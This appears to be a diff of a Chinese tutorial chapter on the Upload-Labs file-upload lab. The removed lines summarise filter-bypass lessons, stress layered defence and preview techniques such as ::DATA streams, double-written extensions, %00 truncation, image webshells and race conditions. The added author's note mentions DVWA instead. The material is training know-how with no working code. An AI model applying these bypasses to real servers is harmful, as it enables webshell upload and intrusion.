-Windows不区分大小写、自动去掉末尾的空格和点，这些特性都可能被利用来绕过过滤。处理文件名的时候一定要注意。
-
-**⑤ 防御要多层，不能只靠一个点！** 🛡️
-就像Pass-04，黑名单列得再全，人家可以上传.htaccess。所以不能只靠后缀名检查，还要检查文件内容，还要限制上传的文件类型，还要做好服务器配置……多层防御才安全。
-
-### 给新手的建议 💡
-
-1. **多动手，别光看**
-   每一关都自己实操一遍，抓包改包，感受一下整个过程。光看是学不会的，动手印象才深刻。
-
-2. **理解原理比死记硬背重要**
-   不要死记硬背"Pass-05是大小写绕过"，要理解"为什么大小写能绕过"、"在什么情况下能绕过"。理解了原理，遇到新的场景你自己就能想出绕过方法。
-
-3. **打完关一定要看源码**
-   源码是最好的老师。看了源码，你才能真正理解它是怎么过滤的，为什么你的方法能绕过。知其然还要知其所以然。
-
-4. **别急着往后赶，基础打牢**
-   前7关都是基础，一定要把这些基础的东西搞懂了再往后学。不然后面更难的关你会听得一头雾水。
-
----
-
-## 下章预告 📢
-
-这一章，我们搞定了Upload-Labs的前7关，学了好几种绕过方法，是不是感觉文件上传漏洞挺有意思的？
-
-但是！这才刚刚开始！前7关只能算是"热身"，后面还有14关等着我们呢！后面的关卡会越来越有挑战性，也越来越有意思！😎
-
-下一章，我们将继续闯关，学习 **Pass-08到Pass-15** 的绕过技巧。比如：
-- **::DATA绕过** —— Windows文件流的又一个特性
-- **双写绕过** —— 过滤了php？那我写pphphp怎么样？
-- **%00截断绕过** —— 经典的老漏洞，虽然老但是很经典
-- **白名单绕过** —— 白名单就真的安全吗？不一定哦
-- **文件头检查绕过** —— 检查文件头？那我们就做图片马
-- **二次渲染绕过** —— 图片被重新生成了怎么办？
-- **条件竞争绕过** —— 先上传再删除？拼手速的时候到了！
-
-是不是光听名字就觉得很刺激？😏
-
-准备好了吗？我们下一章，继续闯关！🚀
+<small>📝 **本章作者寄语**：本章所有资料均来自作者真实教学经验 + CISP-PTE 真实机试考点整理 + OWASP Top10 官方建议。如果这 15 章 DVWA 真的帮到了你，请把它推荐给同样零基础想入行的朋友！授人以鱼不如授人以渔 🌊</small>
